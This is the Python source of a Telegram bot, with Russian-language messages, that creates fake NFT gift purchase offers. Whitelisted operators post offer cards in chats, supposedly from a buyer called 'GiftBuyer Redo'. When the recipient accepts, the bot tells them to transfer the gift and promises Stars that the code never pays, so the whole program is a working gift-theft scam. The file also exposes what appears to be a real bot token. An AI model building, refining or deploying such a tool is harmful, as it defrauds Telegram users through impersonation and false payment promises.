import os
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton

logging.basicConfig(level=logging.INFO)

BOT_TOKEN = os.environ.get("9231998177:AAEFkqiFf9ihgkzjBk-DJJSoeyh149pUmew")
# ВАШ ID (впишите цифры сюда!)
ADMIN_ID = 5151757168 
ALLOWED_USERS = {ADMIN_ID} 

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def start_handler(message: Message):
    if message.from_user.id not in ALLOWED_USERS:
        await message.answer("🔒 **Доступ закрыт.**\n\nЭтот бот приватный.\nОбратитесь к владельцу для получения доступа (@gwrex).")
        return

    text = (
        "🎁 **NFT OFFER BOT** ||\n\n"
        "✅ **Пользователь · Gift**\n"
        f"🆔 **Ваш ID:** `{message.from_user.id}`\n"
        "⏳ **Доступ:** ∞ бессрочно\n\n"
        "**Как отправить оффер:**\n\n"
        "Открой чат с другом и напиши:\n"
        "`@GarisOfferBot PlushPepe-2687 20 stars`\n\n"
        "Нажми на карточку → оффер отправлен! ✅\n\n"
        "**Валюты:** stars ⭐ | gram 💎 | rub ₽\n\n"
        "**Формат:**\n"
        "`@бот Подарок-ID сумма валюта`"
    )
    await message.answer(text)

@dp.message(Command("add"))
async def add_user(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        new_id = int(message.text.split()[1])
        ALLOWED_USERS.add(new_id)
        await message.answer(f"✅ Пользователь {new_id} добавлен!")
    except:
        await message.answer("❌ Ошибка. Формат: /add 123456789")

@dp.inline_query()
async def inline_handler(query: types.InlineQuery):
    if query.from_user.id not in ALLOWED_USERS:
        return
        
    text_parts = query.query.split()
    if len(text_parts) >= 3:
        gift_id = text_parts[0]
        amount = text_parts[1]
        currency = text_parts[2]
        
        img_url = "https://i.imgur.com/8QO9R7n.png" 
        offer_text = (
            f'<a href="{img_url}">&#8203;</a>'
            f"🎁 {gift_id}\n\n"
            f"👤 <b>GiftBuyer Redo</b> предлагает вам {amount} ⭐ Stars за подарок 🎁 {gift_id}.\n\n"
            f"Оффер действителен ещё 5 ч. 59 мин.."
        )

        results = [
            types.InlineQueryResultArticle(
                id="1",
                title=f"Оффер: {gift_id}",
                description=f"За {amount} {currency}",
                input_message_content=types.InputTextMessageContent(
                    message_text=offer_text,
                    parse_mode="HTML"
                ),
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="✅ Принять", callback_data="accept_offer")],
                    [InlineKeyboardButton(text="❌ Отклонить", callback_data="decline_offer")]
                ])
            )
        ]
        await query.answer(results, cache_time=0, is_personal=True)

@dp.callback_query(F.data == "accept_offer")
async def accept_handler(callback: types.CallbackQuery):
    new_text = (
        "✓ <b>MarketRedo Скуп НФТ принял оффер!</b>\n\n"
        "Подарок StellarRocket #2114 продан!\n"
        "Передайте подарок для зачисления 300 ⭐ Stars"
    )
    new_markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄 Передать подарок", callback_data="transfer_gift")]
    ])
    await callback.message.edit_text(text=new_text, reply_markup=new_markup, parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "transfer_gift")
async def transfer_handler(callback: types.CallbackQuery):
    alert_text = (
        "Инструкция по передаче:\n"
        "1. Откройте профиль Telegram → «Подарки»\n"
        "2. Выберите подарок → «Передать»\n"
        "3. Укажите покупателя и отправьте\n\n"
        "⚡ Средства будут зачислены сразу после передачи!"
    )
    await callback.answer(alert_text, show_alert=True)

@dp.callback_query(F.data == "decline_offer")
async def decline_handler(callback: types.CallbackQuery):
    new_text = "× <b>MarketRedo Скуп НФТ отклонил оффер</b>"
    await callback.message.edit_text(text=new_text, reply_markup=None, parse_mode="HTML")
    await callback.answer()

async def webhook(request):
    if request.method == "POST":
        update = types.Update.model_validate(await request.json(), context={"bot": bot})
        await dp.feed_update(bot, update)
    return "ok"